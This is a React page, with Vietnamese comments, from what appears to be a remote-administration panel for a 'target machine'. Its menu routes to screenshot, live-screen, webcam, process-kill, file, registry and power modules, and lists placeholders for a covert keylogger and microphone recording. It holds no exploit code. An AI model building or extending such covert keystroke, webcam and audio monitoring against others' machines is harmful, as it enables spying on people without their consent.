// web-app/frontend/src/pages/MachinePage.jsx
import React, { useState } from 'react';
import { useParams, useNavigate } from 'react-router-dom';

// --- 📦 IMPORT CÁC MODULE ĐÃ HOÀN THÀNH ---
import ProcessesManager from '../components/modules/Processes';
import PowerControl from '../components/modules/PowerControl';
import Applications from '../components/modules/Applications';
import Screenshot from '../components/modules/Screenshot';
// 🌟 MỚI: Import 2 module Real-time (WebSocket) vừa phát triển
import LiveScreen from '../components/modules/LiveScreen';
import WebcamMonitor from '../components/modules/Webcam';

function MachinePage() {
  const { id } = useParams();
  const navigate = useNavigate();

  const [activeTab, setActiveTab] = useState('processes');

  // Cấu hình danh sách Menu bên trái
  const menuItems = [
    { id: 'apps', label: '1. Danh Sách Ứng Dụng', desc: 'Quét phần mềm hệ thống' },
    { id: 'processes', label: '2. Quản Lý Tiến Trình', desc: 'Task Manager & Diệt PID' },
    { id: 'screenshot', label: '3. Chụp Màn Hình', desc: 'Bản chụp ảnh từ xa (Base64)' },
    { id: 'live-screen', label: '4. Xem Trực Tiếp', desc: 'Luồng livestream màn hình' },
    { id: 'webcam', label: '5. Giám Sát Webcam', desc: 'Truyền phát camera thời gian thực' }, // 🌟 Đã thêm Webcam
    { id: 'keylogger', label: '6. Nhật Ký Bàn Phím', desc: 'Theo dõi phím gõ ngầm trên RAM' },
    { id: 'files', label: '7. Quản Lý Tập Tin', desc: 'Xem, tải xuống, xóa file an toàn' },
    { id: 'hardware', label: '8. Phần Cứng & Registry', desc: 'Thông số RAM, CPU & Registry' },
    { id: 'power', label: '9. Điều Khiển Nguồn', desc: 'Tắt nguồn, khởi động, khóa máy' },
    { id: 'audio-monitor', label: '🎧 Giám Sát Âm Thanh', desc: 'Thu âm micro (Phát triển thêm)', isSub: true }
  ];

  const renderModuleContent = () => {
    switch (activeTab) {
      // --- 🛠️ ĐỊNH TUYẾN CÁC TÍNH NĂNG ĐÃ CHẠY ĐƯỢC ---
      case 'apps':
        return <Applications machineId={id} />;
      case 'processes':
        return <ProcessesManager machineId={id} />;
      case 'screenshot':
        return <Screenshot machineId={id} />;
      case 'power':
        return <PowerControl machineId={id} />;
      // 🌟 KÍCH HOẠT ĐỊNH TUYẾN CHO LIVE SCREEN VÀ WEBCAM
      case 'live-screen':
        return <LiveScreen machineId={id} />;
      case 'webcam':
        return <WebcamMonitor machineId={id} />;

      // --- ⏳ CÁC TÍNH NĂNG ĐANG XÂY DỰNG TIẾP THEO ---
      case 'keylogger':
      case 'files':
      case 'hardware':
        return (
          <div style={styles.placeholderContainer}>
            <div style={styles.placeholderIcon}>⚙️</div>
            <h3 style={styles.placeholderTitle}>Module Đang Được Xây Dựng</h3>
            <p style={styles.placeholderDesc}>Giao diện tính năng đã được cấu hình định tuyến sẵn sàng.</p>
          </div>
        );
      case 'audio-monitor':
        return (
          <div style={{...styles.placeholderContainer, borderStyle: 'dashed', backgroundColor: '#fff5f7'}}>
            <div style={{...styles.placeholderIcon, color: '#ec4899'}}>🎧</div>
            <h3 style={styles.placeholderTitle}>Audio Monitor (Tính năng phụ)</h3>
            <p style={styles.placeholderDesc}>Hệ thống đã bọc lót sẵn cấu trúc hạ tầng.</p>
          </div>
        );
      default:
        return <div style={styles.message}>Không tìm thấy tính năng yêu cầu.</div>;
    }
  };

  return (
    <div style={styles.container}>
      <nav style={styles.navbar}>
        <div style={styles.navLeft}>
          <button onClick={() => navigate('/dashboard')} style={styles.backBtn}>⬅️ Quay Lại</button>
          <h2 style={styles.logo}>⚙️ Bảng Điều Khiển Thiết Bị</h2>
        </div>
        <div style={styles.navRight}>
          <span style={styles.machineBadge}>MÁY MỤC TIÊU: <strong style={{fontFamily: 'monospace'}}>{id}</strong></span>
        </div>
      </nav>

      <div style={styles.layoutBody}>
        <aside style={styles.sidebar}>
          <div style={styles.sidebarTitle}>DANH MỤC CHỨC NĂNG</div>
          <div style={styles.menuList}>
            {menuItems.map((item) => {
              const isActive = activeTab === item.id;
              return (
                <button
                  key={item.id}
                  onClick={() => setActiveTab(item.id)}
                  style={{
                    ...styles.menuItem,
                    backgroundColor: isActive ? '#2563eb' : item.isSub ? '#fdf2f8' : 'white',
                    color: isActive ? 'white' : '#1e293b',
                    borderColor: isActive ? '#2563eb' : '#e2e8f0',
                  }}
                >
                  <div style={{fontWeight: 'bold', fontSize: '0.9rem'}}>{item.label}</div>
                  <div style={{ fontSize: '0.75rem', marginTop: '0.25rem', color: isActive ? '#93c5fd' : '#64748b' }}>
                    {item.desc}
                  </div>
                </button>
              );
            })}
          </div>
        </aside>

        <main style={styles.mainContent}>
          {renderModuleContent()}
        </main>
      </div>
    </div>
  );
}

// (Phần styles giữ nguyên như cũ, bỏ qua cho gọn nhé)
const styles = {
  container: { backgroundColor: '#f8fafc', minHeight: '100vh', fontFamily: 'Segoe UI, sans-serif', display: 'flex', flexDirection: 'column' },
  navbar: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', backgroundColor: '#0f172a', padding: '1rem 2rem', color: 'white', boxShadow: '0 4px 6px -1px rgba(0,0,0,0.1)', zIndex: 10 },
  navLeft: { display: 'flex', alignItems: 'center', gap: '1.5rem' },
  logo: { margin: 0, fontSize: '1.2rem', fontWeight: 'bold' },
  backBtn: { backgroundColor: '#334155', color: 'white', border: 'none', padding: '0.5rem 1rem', borderRadius: '6px', cursor: 'pointer', fontWeight: '600', fontSize: '0.85rem', transition: 'background-color 0.2s' },
  navRight: { display: 'flex', alignItems: 'center' },
  machineBadge: { fontSize: '0.85rem', color: '#cbd5e1', backgroundColor: '#1e293b', padding: '0.5rem 1rem', borderRadius: '6px', border: '1px solid #334155' },
  layoutBody: { display: 'flex', flex: 1, flexDirection: 'row', minHeight: 'calc(100vh - 65px)' },
  sidebar: { width: '300px', backgroundColor: 'white', borderRight: '1px solid #e2e8f0', padding: '1.5rem 1rem', display: 'flex', flexDirection: 'column', gap: '1rem' },
  sidebarTitle: { fontSize: '0.75rem', fontWeight: 'bold', color: '#94a3b8', letterSpacing: '0.05em', paddingLeft: '0.5rem' },
  menuList: { display: 'flex', flexDirection: 'column', gap: '0.5rem' },
  menuItem: { width: '100%', padding: '0.75rem 1rem', borderRadius: '8px', border: '1px solid', cursor: 'pointer', textAlign: 'left', transition: 'all 0.2s', display: 'flex', flexDirection: 'column' },
  mainContent: { flex: 1, padding: '2rem', overflowY: 'auto' },
  placeholderContainer: { backgroundColor: 'white', border: '1px solid #e2e8f0', borderRadius: '12px', padding: '4rem 2rem', textAlign: 'center', boxShadow: '0 4px 6px -1px rgba(0,0,0,0.05)', maxWidth: '600px', margin: '2rem auto' },
  placeholderIcon: { fontSize: '2.5rem', margin: '0 auto 1rem', color: '#3b82f6', width: 'fit-content' },
  placeholderTitle: { margin: '0 0 0.5rem 0', fontSize: '1.2rem', color: '#1e293b', fontWeight: 'bold' },
  placeholderDesc: { margin: 0, fontSize: '0.875rem', color: '#64748b', lineHeight: '1.6' },
  message: { textAlign: 'center', padding: '3rem', fontSize: '1.1rem', color: '#64748b', fontWeight: '500' }
};

export default MachinePage;